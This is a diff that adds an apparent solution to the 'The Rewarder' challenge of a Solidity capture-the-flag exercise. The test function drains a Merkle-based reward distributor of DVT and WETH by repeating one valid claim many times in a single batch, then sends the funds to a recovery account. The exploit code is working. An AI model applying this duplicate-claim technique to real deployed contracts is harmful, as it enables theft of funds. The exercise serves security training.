@@ -148,7 +148,47 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Players index and amounts to claim are in the distribution files, dvt-distribution.json and weth-distribution.json
+        uint256 playerIndex = 188;
+        uint256 dvtAmountToClaim = 11524763827831882;
+        uint256 wethAmountToClaim = 1171088749244340;
+
+        // Calculate amounts to steal from the distributor
+        uint256 dvtClaimsAmount = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / dvtAmountToClaim;
+        uint256 wethClaimsAmount = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / wethAmountToClaim;
+
+        // Create arrays for claimRewards() to claim DVT
+        Claim[] memory claims = new Claim[](dvtClaimsAmount + wethClaimsAmount);
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // DVT claim
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerIndex);
+        Claim memory dvtClaim = Claim({batchNumber: 0, amount: dvtAmountToClaim, tokenIndex: 0, proof: dvtProof});
+
+        // WETH claim
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerIndex);
+        Claim memory wethClaim = Claim({batchNumber: 0, amount: wethAmountToClaim, tokenIndex: 1, proof: wethProof});
+
+        // Populate claim[] with dvtClaim first
+        for (uint256 i = 0; i < dvtClaimsAmount; i++) {
+            claims[i] = dvtClaim;
+        }
+
+        // Populate the rest if indexes with wethClaim
+        for (uint256 i = dvtClaimsAmount; i < claims.length; i++) {
+            claims[i] = wethClaim;
+        }
+
+        // Steal DVT
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokens});
+
+        // Transfer stolen funds to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
